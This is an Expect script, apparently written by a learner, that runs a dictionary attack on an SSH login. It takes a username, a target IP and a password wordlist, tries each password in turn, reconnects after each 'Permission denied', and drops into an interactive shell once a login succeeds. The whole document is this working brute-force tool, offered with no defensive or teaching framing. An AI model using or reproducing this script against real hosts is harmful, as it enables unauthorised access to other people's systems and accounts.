#!/usr/bin/expect 


##lindex=list index? [0]=first arguement
#arguements are: username, password and ip address

set user [lindex $argv 0]
set ip  [lindex $argv 1]
set wordlist  [lindex $argv 2]
#----------------------------------------------
set argcount [llength $argv];
#puts "$argcount"
#sleep 3
if { $argcount != 3 } {
puts "~~~~syntax_err:you need at least 3 arguements!~~~~~"
puts "arguements are: username,IP address and password-list"
exit
}

##opens $wordlist, then reads the list--reading each line individually as an item
##if theres empty lines in a list it will count that as an item in the list
set wlo [open "$wordlist"]
set wlr [split [read $wlo] "\n"] 


spawn ssh $user@$ip

##pass becomes every item in the list $wlr
##exp_continue will loop through the expect block again if triggered
foreach pass $wlr {

expect {

	"elcome" { interact;exit}
	"ermission denied (publickey,password)" {
			spawn ssh $user@$ip
			exp_continue
	                                       }
	"assword" {
	send "$pass\r"
	      	  }
	
}

}


#----interact allows you to interact with ssh ??------ gain control back